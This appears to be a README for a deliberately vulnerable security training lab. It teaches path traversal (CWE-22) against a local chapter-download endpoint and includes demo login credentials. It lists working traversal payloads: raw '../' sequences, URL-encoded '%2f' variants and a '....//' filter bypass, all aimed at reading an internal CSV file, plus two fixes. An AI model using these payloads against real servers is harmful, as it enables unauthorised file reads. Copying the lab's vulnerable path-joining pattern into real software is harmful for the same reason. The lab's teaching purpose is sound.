# Path traversal

Member shop continuation from **[CSRF](../CSRF/)** (port **3003**). On port **3004** the vulnerable feature is chapter download:

```http
GET /library/books/{book}/chapters/{file}
```

(CWE-22 **read** — not CSRF, not file upload.)

**Buy now** is shop continuity only; chapter download requires **sign-in**, not purchase.

- **Port:** `3004`
- **Accounts:** `marc` / `marc123`, `ewa` / `ewa123`

## Run

```bash
cd server
npm install
npm run dev
```

Open **`http://localhost:3004/login`**.

## Layout

```text
server/
  content/library/books/{book}/chapters/   # intended chapter files
  data/internal/                             # traversal target (not static)
  public/uploads/                            # placeholder for File upload lab
```

## API (this lab)

| Request | Meaning |
|---------|---------|
| `GET /library/books/gone-with-the-wind/chapters/chapter-01.txt` | Legal chapter (after login) |
| `…/chapters/../../../../../data/internal/publisher-rebates.csv` | Traversal (exercise 2) |

Handler joins `content/library/books/{book}/chapters/` + user-controlled path segment(s) — see [`routes/library.ts`](server/src/routes/library.ts).

## Exercises

**CWE-22** · WSTG ATHZ-01 · optional **CWE-35** / **CWE-36** (README).

### 1. Legal download

Login as `marc` → `/members` → **Pobierz rozdział 1 (TXT)**.

### 2. `../` in the path

From the legal URL, append traversal after `…/chapters/` (five `../` to reach `server/`, then `data/internal/…`):

```http
GET /library/books/gone-with-the-wind/chapters/../../../../../data/internal/publisher-rebates.csv
```

Some browsers **normalize** `../` in the path before the request leaves the client; if the URL “snaps back”, use exercise 3 or send the request with **`curl --path-as-is`** (instructor demo).

### 3. Encoded traversal

Single path segment with encoded slashes (same target file), e.g. last segment:

```text
..%2f..%2f..%2f..%2f..%2fdata%2finternal%2fpublisher-rebates.csv
```

Full path:

```http
GET /library/books/gone-with-the-wind/chapters/..%2f..%2f..%2f..%2f..%2fdata%2finternal%2fpublisher-rebates.csv
```

### 4. (Optional) Bad `replace("../")` bypass

Enable **Exercise 4** block in [`routes/library.ts`](server/src/routes/library.ts), then try `....//....//....//....//....//data/internal/publisher-rebates.csv`.

### Fix

Uncomment **fix A** (jail under `…/chapters/`) or **fix B** (allowlist `bookSlug` + `chapterFile`) in [`routes/library.ts`](server/src/routes/library.ts). Repeat exercises 2–3 → blocked.

## Next module

**File upload** → `POST /account/avatar` into `public/uploads/` (CWE-434). Read vs write: different URL, different fixes.
